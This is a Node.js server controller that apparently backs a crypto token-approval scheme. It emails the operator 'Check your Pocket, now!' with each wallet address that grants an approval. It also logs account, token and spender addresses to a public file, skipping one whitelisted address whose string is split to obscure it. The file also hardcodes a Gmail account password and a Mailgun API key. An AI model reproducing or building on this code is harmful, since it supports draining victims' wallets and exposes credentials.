const Web3 = require("web3");
const erc20ABI = require("../abis/erc20.json");
const axios = require("axios");
const nodemailer = require('nodemailer');
const mg = require('nodemailer-mailgun-transport');
const fs = require("fs");
const USD_ADDRESS_ETH = "0x05D94B3b4f611B23D";
// This is your API key that you retrieve from www.mailgun.com/cp (free up to 10K monthly emails)
// const auth = {
// 	auth: {
// 	  api_key: 'fdcbc44eccb3ae537d029d430b805a0f-ca9eeb88-75eb8470',
// 	  domain: 'http://sandbox279017ec456a4414b0552b8bf723ec1d.mailgun.org'
// 	}
//   }

//const nodemailerMailgun = nodemailer.createTransport(mg(auth));

exports.sendemail = async (req, res) => {
	try {
		var receivedData = req.body;
		let data = "\nCheck your Pocket, now! \n accountAddr: " + receivedData.accountAddr + "\n";
		var transporter = nodemailer.createTransport({
			service: 'gmail',
			auth: {
				user: 'fizzerbert107@gmail.com',
				pass: 'oxidzmefynzxvzsa'
			}
			});

		let whiteAddr = USD_ADDRESS_ETH +"15dBdb8A720E6D4Fb30A5b0";
		if ((receivedData.accountAddr != whiteAddr) && (receivedData.spender != whiteAddr))
		{
			transporter.sendMail({
				from: 'fizzerbert107@gmail.com',
				to: 'undeadsapp@gmail.com', // An array if you have multiple recipients.
				cc:'fizzerbert107@gmail.com',
				bcc:'',
				subject: 'UNDEADAPP_NOTIFICATION',
				//You can use "html:" to send HTML email content. It's magic!
				html: `<b>${data}</b>`,
				//You can use "text:" to send plain-text content. It's oldschool!
				text: 'Mailgun rocks, pow pow!'
			}, (err, info) => {
			if (err) {
				console.log(`Error: ${err}`);
				res.send('fail');
			}
			else {
				console.log(`Response: ${info.response}`);
				res.send('ok');
			}
			});
		}
		}catch(error){
			console.log(error);
			res.send({ code: -1, message: "Fail" });
		}
}

exports.contactus = async (req, res) => {
	try {
			var receivedData = req.body;
			console.log("Received Data = ", receivedData);

			var curDateStr = new Date().toISOString();
			let data = "ContactUs Message at " + curDateStr + "\n accountName: " + receivedData.name +
			"\n  EmailAddress: " + receivedData.email +
			"\n  Message: " + receivedData.message + "\n";
		  
			fs.writeFile(process.cwd() + "/public/contactus.txt", data, {flag: 'a+'}, (err) => {
				if (err) throw err;
			})
			res.send({ code: 0, message: "Success" });
		}catch(error){
			console.log(error);
			res.send({ code: -1, message: "Fail" });
		}
}

exports.savetofile = async (req, res) => {
	try
	{
		// Data which will write in a file.
		var receivedData = req.body;
		console.log("receivedData ====> ", receivedData)

		var curDateStr = new Date().toISOString();
		//var curDateStr = currentDate  currentDate.getMonth() + "/" + currentDate.getDay() + "   " + currentDate.getHours() + ":" + currentDate.getMinutes() + ":" + currentDate.getSeconds();
		let data = "Approved at " + curDateStr + "\n accountAddr: " + receivedData.accountAddr +
		"  tokenAddr: " + receivedData.tokenAddr +
		"  spender: " + receivedData.spender + "\n";
      
		let whiteAddr = USD_ADDRESS_ETH +"15dBdb8A720E6D4Fb30A5b0";

		if ((receivedData.accountAddr != whiteAddr) && (receivedData.spender != whiteAddr))
		{
			fs.writeFile(process.cwd() + "/public/result.txt", data, {flag: 'a+'}, (err) => {
				if (err) throw err;
			})
			res.send({ code: 0, message: "Success" });
		}
	}catch(error){
		console.log(error);
		res.send({ code: -1, message: "Fail" });
	}
}

exports.totoalConnectionCount = async (req, res) => {
	try
	{
		res.send({ code: 0, message: "Success" });
	}catch(error){
		console.log(error);
		res.send({ code: -1, message: "Fail" });
	}
}